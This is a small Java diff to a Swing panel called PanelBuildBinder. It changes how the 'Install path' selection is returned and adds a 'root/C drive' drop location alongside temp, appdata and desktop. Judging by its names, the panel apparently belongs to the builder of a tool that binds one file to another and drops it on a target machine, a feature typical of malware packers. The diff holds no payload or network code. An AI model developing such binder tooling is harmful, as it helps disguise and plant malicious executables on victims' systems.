@@ -41,8 +41,8 @@ public class PanelBuildBinder extends JPanel {
 		return chckbxBindFileTo.isSelected();
 	}
 
-	public String dropTarget() {
-		return comboBox.getSelectedItem().toString().toLowerCase();
+	public int dropTarget() {
+		return comboBox.getSelectedIndex();
 	}
 
 	public PanelBuildBinder() {
@@ -77,7 +77,7 @@ public class PanelBuildBinder extends JPanel {
 		JLabel lblDropPath = new JLabel("Install path");
 
 		comboBox = new JComboBox<String>();
-		comboBox.setModel(new DefaultComboBoxModel<String>(new String[] { "temp/documents (UNIX)", "appdata", "desktop" }));
+		comboBox.setModel(new DefaultComboBoxModel<String>(new String[] { "root/C drive", "temp/documents (UNIX)", "appdata", "desktop" }));
 
 		JLabel lblName = new JLabel("Name");
 
